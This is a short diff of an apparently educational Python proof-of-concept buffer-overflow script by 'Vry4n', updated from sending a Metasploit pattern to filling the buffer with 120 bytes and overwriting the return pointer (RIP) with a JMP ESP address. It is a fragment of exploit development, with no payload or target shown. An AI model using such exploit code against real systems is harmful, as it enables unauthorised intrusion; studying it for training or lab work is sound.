@@ -1,8 +1,8 @@
 #!/usr/bin/python
 import socket
 
-# Part 3 of proof of concept by Vry4n
-# This script is intended send a pattern created with Metasploit pattern_create.rb script
+# Part 6 of proof of concept by Vry4n
+# This script is intended fill the buffer and execute JUMPESP using RIP
 
 FUZZ = 'A' * 120
 RIP = b"\xfb\x0c\x40\x00"
